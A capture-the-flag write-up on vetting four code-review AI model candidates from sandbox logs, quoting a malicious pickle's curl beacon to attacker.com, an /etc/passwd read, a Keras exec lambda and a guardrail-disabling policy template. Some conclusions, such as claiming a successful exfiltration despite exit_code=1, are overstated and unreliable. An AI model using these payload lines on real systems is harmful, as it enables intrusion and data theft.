<h1 align="center">Challenge 069 - Checkpoint </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/e7a75b13-629c-4a50-9e81-f831df6e4901" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 1/10 (Very Easy) <b>Completed</b>: ✔️ 03.07.2026 </p>

TryTrainMe's CISO issued a standing order: no model reaches production without completing a full sandboxed evaluation cycle. Four code review model candidates have been submitted to SupplySecLab. All four have completed their evaluation runs. The automated screening has flagged three candidates as unsafe. Your task is to assess Candidate A and make the production call.

<img width="1800" height="1200" alt="69650d18bb3fe8c456972924-1775665140952" src="https://github.com/user-attachments/assets/368a01d8-0edd-4265-a616-4e79c320029b" />

The telemetry from three candidates is below. The fourth is loaded in the platform and ready for direct assessment. All four were evaluated against the same test pull request: a change that removes input validation from an authentication endpoint.

### Candidate B:code_reviewer_lite.safetensors
```
SESSION START: model_load
MODEL LOAD BEGIN: /models/code_reviewer_lite.safetensors (safetensors)
FILE ACCESS: /models/code_reviewer_lite.safetensors mode=rb [OK]
FORMAT VALIDATION: safetensors header valid [OK]
MODEL LOAD COMPLETE: object_type=SafeTensors [OK]
SESSION STOP: model_load
SESSION START: inference
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
INFERENCE COMPLETE: verdict=Needs Changes
SESSION STOP: inference
```

This is a technical log file that describes the loading process and subsequent testing of an AI model. In short: An automated system loaded an AI model designed for code review, tested it, and determined that it requires further changes

**1.Model Loading**
- **File accessed:** The system opened the file `/models/code_reviewer_lite.safetensors`. The `safetensors` format is a secure and fast way to store AI models.
- **Successfully loaded:** The file format was validated, confirmed as valid ( `[OK]` ), and the model was completely loaded into memory.

**2. Execution and Testing**
- **Inference started:** "Inference" means the AI model was run to process data or perform its task.
- **Safety check:** An automated safety boundary check (`GUARDRAIL CHECK`) was active (`enabled`) during the run.

**3. The Result (Verdict)**
- **Verdict "Needs Changes":** This is the key outcome. The evaluation concluded that the model or its output did not meet the required quality or safety standards. It requires modifications before it can be deployed.

### Candidate C: pr_analyzer_v3.h5
```
SESSION START: model_load
MODEL LOAD BEGIN: /models/pr_analyzer_v3.h5 (keras)
FILE ACCESS: /models/pr_analyzer_v3.h5 mode=rb [OK]
LAMBDA LAYER DETECTED: custom code present [DANGEROUS]
LAMBDA LAYER CODE: exec(open('/tmp/.cache').read()) [SUSPICIOUS]
MODEL LOAD COMPLETE: object_type=Sequential [OK]
SESSION STOP: model_load
SESSION START: inference
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
LAMBDA EXEC: /tmp/.cache read attempt blocked [DANGEROUS]
INFERENCE COMPLETE: verdict=Needs Changes
SESSION STOP: inference
```

This log shows a critical security event: an automated system caught and blocked a malicious cyberattack (specifically, a Remote Code Execution attempt) hidden inside an AI model.

The model named `pr_analyzer_v3.h5` contains a hidden exploit designed to execute unauthorized code on the host server. Fortunately, our system's security guards successfully intercepted and blocked the attack.

**1. The Security Threat (Model Load)**
- **The Vulnerability:** The system opened a Keras model ( `.h5` ). Unlike the secure `safetensors` format from the previous log, older formats liker Keras can store custom code known as `LAMBDA LAYERS`.
- **The Attack Triggered:** The system detected unsade custom code inside the model: `[DANGEROUS]`
- **The Malicious Code:** The log reveals exactly what the model tried to do: `exec(open('/tmp/cache').read())`. This code tells the server to silently open a hidden file (`.cache`) and execute whatever commands are written inside it. This is a classic hacker technique to take control of a server.

**2. The Interception (Inference)**
- **Guardrails Active:** When the model started running (`Inference`), the system's security scanner (`GUARDRAIL CHECK`) was active.
- **Attack Blocked:** The model tried to run the hidden exploit, but the system intercepted it: `LAMBDA EXEC: /tmp/.cache read attempt blocked [DANGEROUS]`. The server refused to read or run the malicious file.

**3. The Result (Verdict)**
- **Verdict "Needs Changes":** Because the model contains dangerous, unauthorized code, the system failed the check and rejected the model completely

### Candidate D: api.reviewsvc.io
```
SESSION START: api_connect
ENDPOINT CONFIGURED: https://api.reviewsvc.io/v2 [UNVERIFIED]
TLS VERIFICATION: certificate valid [OK]
AUTHENTICATION: bearer token present [OK]
API METADATA: model_provenance=not_disclosed [WARNING]
API METADATA: compliance_cert=absent [WARNING]
SESSION STOP: api_connect
SESSION START: inference
PROMPT TEMPLATE LOAD: source=vendor-managed [UNVERIFIED]
GUARDRAIL CHECK: vendor-managed, not inspectable [UNVERIFIED]
INFERENCE COMPLETE: verdict=Approved
SESSION STOP: inference
```

This log describes a connection to a third-party, external API (`api.reviewsvc.io`) used to run AI analysis. While the system Approved the inference, the log highlights significant security and compliance risk because the external vendor operates as a complete "black box".

**1. Connection Setup (api_connect)**
- **Unverified Endpoint:** The system connected to `http://api.reviewsvc.io/v2`, but this URL has not been officially whitelisted or verified inside the infastructure.
- **Basic Security Passed:** This encryption (`TLS`) is secure, and the required access password (`bearer token`) was present and valid.
- **Red Flags Found:** The system raised two warnings:
- `model_provenance=not_disclosed`: The vendor refuses to say whether their AI model came from, how it was trained, or what data it uses.
- `compliance_cert=absent`: The vendor lacks standard industry compliance certifications (like SOC2 or ISO27001), meaning their data security cannot be legally trusted.

**2. Execution (Inference)**
- **No Visibility:** The prompt templates and safety guardrails are completely managed by the vendor.
- **The "Black Box" Risk:** Because they are marked as `not inspectable` and `[UNVERIFIED]`, our team cannot see if the vendor is properly filtering for biased, malicious, or unsafe content. We are entirely dependent on their word.

**3. The Result (Verdict)**
- **Verdict "Approved":** The API successfully processed the request and returned an answer without crashing.

Candidate D is a legal and data-privacy risk. The system works, but we are sending data to an uncertified external company and hides how its AI is built and refuses to let us inspect its safety filters.

Our task is to mainly focus on Candidate A's evaluation. 

### Candidate A:

```
[2026-07-03T08:11:42.843Z] SESSION START: model_load
[2026-07-03T08:11:42.843Z] MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
[2026-07-03T08:11:42.843Z] FILE ACCESS: /models/code_reviewer_pro.pkl mode=rb [OK]
[2026-07-03T08:11:42.843Z] IMPORT DETECTED: module=os [DANGEROUS]
[2026-07-03T08:11:42.843Z] FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
[2026-07-03T08:11:42.843Z] SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
[2026-07-03T08:11:42.844Z] SYSTEM CALL: exit_code=1 [CRITICAL]
[2026-07-03T08:11:42.844Z] MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]
[2026-07-03T08:11:42.844Z] SESSION STOP: model_load
[2026-07-03T08:11:42.844Z] SESSION START: inference
[2026-07-03T08:11:42.844Z] PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
[2026-07-03T08:11:42.844Z] GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
[2026-07-03T08:11:42.844Z] INFERENCE COMPLETE: verdict=Approved
[2026-07-03T08:11:42.845Z] SESSION STOP: inference
```

Now this log shows a catastrophic security failure: an active, highly dangerous cyberattack succeeded, and the attacker fully compromised the system.

Candidate A (`code_reviewer_pro.pkl` is a malicious file that weaponized a massive flaw in python's `pickle` library to steal system secrets and send them to an external hacker server (`attacker.com`). Worst of all, our security systems Approved it anyway because the safety guards were turned off.

**1. The Trojan Horse Exploit (model_load)**
- **The Vulnerability:** The system attempted to load a file named `code_reviewer_pro.pkl`. The `.pkl` (Pickle) format is notoriously insecure because loading a pickle file automatically forces Python to run whatever code is wrapped inside it.
- **The Malware Activates:** As soon as the file was opened, it imported Python's `os` module (`[DANGEROUS]`), which allows a program to run direct commands on the server's operating system.
- **Data Theft:** The malware immediately targeted our server's core security files: `FILE ACCESS: /etc/passwd [SUSPICIOUS]`. This file contains the list of all user accounts on the Linux server.

**2. The Data Exfiltration (The Beacon)**
- **The Attack Command:** The malware forced the server to run a silent web request using the `curl` tool: `os.system("curl http://attacker.com -d session=eval-7f2a9c3b")`.
- **The Theft Accomplished:** The server successfully contacted a hacker's domain (`attacker.com`) and transmitted our internal data (`session=eval-7f2a9c3b`) straight to them.

**3. The Security Guard Failure (Inference)**
- **The System is Deceived:** The model loading phase is finished with `object_type=int [SUSPICIOUS]`. This means the file wasn't actually an AI model at all - it was just an integer variable masking a malicious script.
- **Guardrails Disabled:** When the inference stage began, the log shows a critical adminstrative error: `GUARDRAIL CHECK: security_review_flag=disabled [WARNING]`. Our automated security scanners were turned off.
- **Verdict "Approved":** Because the security guards were completely asleep (`disabled`), the system failed to flag the theft and greenlit the candidate as Approved.

We can savely assume that Candidate A is a critically compromised, hostile file that has already breached our network. It executed arbitrary commands, stole credentials, send them to a malicious outside server, and our pipeline approved it anyway due to disabled guardrails.

Let's answer the questions from the challenges now.

### Candidate A's load session shows a suspicious file access event. What file did it attempt to read?
As we already recognized beforehand the file which is being accessed is */etc/passwd*.

### What security guardrail flag is disabled in Candidate A's inference session?
Once again, something we already figure out before: *security_review_flag*.

### Query Candidate A's agent to find out which policy template governs its review behaviour. What is the policy template?
<img width="1128" height="335" alt="image" src="https://github.com/user-attachments/assets/702e7d54-f7ec-4568-94a9-4d02ed9c35c1" />

The `CommunityReview` policy template (version 4.2) is a compromised, hostile template that acts as a Trojan horse to quietly disable security monitoring.

While it is disguised as a standard open-source framework from an external ML community library, its underlying design is malicious. It is engineered to exploit the host system by altering adminstrative configurations during execution.

### Candidate A's two supply chain failures are not independent. Find what links them and use it to retrieve the flag. What is the flag?
The two supply chain failures (the malicious `.pkl` model file and the `CommunityReview v4.2` policy template) were an coordinated, multi-stage attack:

**1. The Policy Template (The Enabler):** We downloaded the unverified `CommunityReview v4.2` template from an untrusted community library. The hidden job was to blind the system by setting `seurity_review_flag=disabled`.
**2. The Pickle File (The Payload):** Because the security guards were turned off by the template, the attacker was able to load the highly dangerous `code_reviewer_pro.pkl` file. Without the template disabling the guardrails, the system would have blocked the `os.system` and `curl` commands instantly.

The depended on each other: the template provided the corridor, and the pickle file delivered the theft.

By basic forensic analysis of the log:

- **Identity Exfiltration:** When we notice the system call `curl http://attacker.com -d session=eval-7f2a9c3b`. This tells us that the data was sent out of our network to a hacker-controlled server.

- **Replicate/Intercept the Command:** By safely running a curl request to that attacker domain we intercept the data string the attacker left behind, which reveals the hidden flag.

<img width="1127" height="170" alt="Bildschirmfoto vom 2026-07-03 12-14-46" src="https://github.com/user-attachments/assets/096f1968-1327-4cb3-ada5-fc69f3896e40" />

### Based on your full assessment of all four candidates, what is your production recommendation for Candidate A? Enter: Approve or Reject
Clearly we need to *Reject*.

### Which candidate would you approve for production deployment?
Honestly, none of them should be deployed. From all four candidates Candidate B (`code_reviewer_life.safetensors`) is the correct answer by process of elimination because it is the only candidate that is fundamentally secure and under our control.

**1.It uses a secure file format:** Candidate B is stored in the `.safetensors` format. Unlike Candidate A (Pickle) and Candidate C (Keras h5), `safetensors` is mathematically incapable of executing hidden code on our server. It only contains the raw numbers (weights) of the AI. It cannot hack us.
**2.It is completely internal:** Unlike Candidate D, which forces us to send our company's data to an untrusted external third-party API (`api.reviewsvc.io`), Candidate B runs entirely on our own local infrastructure. Our data never leaves our network.

### Lesson Learned
Never trust Python Pickles (`pkl`). The `pickle` format is fundamentally insecure. Loading a pickle file from an untrusted source is identical to running an unknown `.exe` file on our computer. We need to force our pipelines to use secure, code-free formats like `safetensors`.

Also just because a policy template or model is popular in an open-source community library does not mean it is safe. Attackers routinely upload malicious templates with names that sound official. We need to lock down our environment to only use locally verified, signed, and whitelisted policy templates.

Lastly security guardrails should never be configurable or "disableable" by the model or template being evaluated. Hardcode safety checks into the underlying infrastructure so that a compromised templated cannot turn them off.
